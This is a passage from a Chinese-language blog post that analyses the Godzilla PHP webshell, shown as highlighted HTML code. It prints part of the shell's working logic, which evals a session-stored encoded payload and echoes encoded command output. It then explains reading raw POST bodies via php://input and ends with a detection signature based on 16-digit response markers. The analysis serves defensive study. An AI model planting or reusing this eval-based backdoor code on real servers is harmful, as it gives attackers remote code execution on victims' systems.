        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span><span class="s2">"getBasicsInfo"</span><span class="p">)</span><span class="o">===</span><span class="kc">false</span><span class="p">){</span>
            <span class="nv">$payload</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
        <span class="p">}</span>
		<span class="k">eval</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nf">encode</span><span class="p">(</span><span class="o">@</span><span class="nf">run</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span><span class="nv">$key</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="s2">"getBasicsInfo"</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">]</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<p>关键代码：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$data</span><span class="o">=</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"php://input"</span><span class="p">);</span>
</code></pre></div></div>

<p>经典的php伪协议   <strong>php://input</strong></p>

<p>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code class="language-plaintext highlighter-rouge">data</code>部分，在<code class="language-plaintext highlighter-rouge">enctype="multipart/form-data"</code> 的时候<code class="language-plaintext highlighter-rouge">php://input </code>是无效的。</p>

<p>说白了就是把post请求正文的内容按照php代码执行，这点说起来和eval()函数的功能很像</p>

<h1 id="暂完">暂完</h1>

<p>硬说特征，哥斯拉不论是php还是java，默认返回包里，开头和末尾16位的数字算个应该算个强特征，当然这在webshell里可以直接修改，对高级点儿的没啥用</p>


  </div>

</article>

</section>
<nav class="navbar navbar-default navbar-fixed-bottom">
  <div class="container footer-content">
    Happy with <i class ="fa fa-heart"></i> by P001water<br>
    Powered By May1as 
  </div>
</nav>

  </body>

</html>
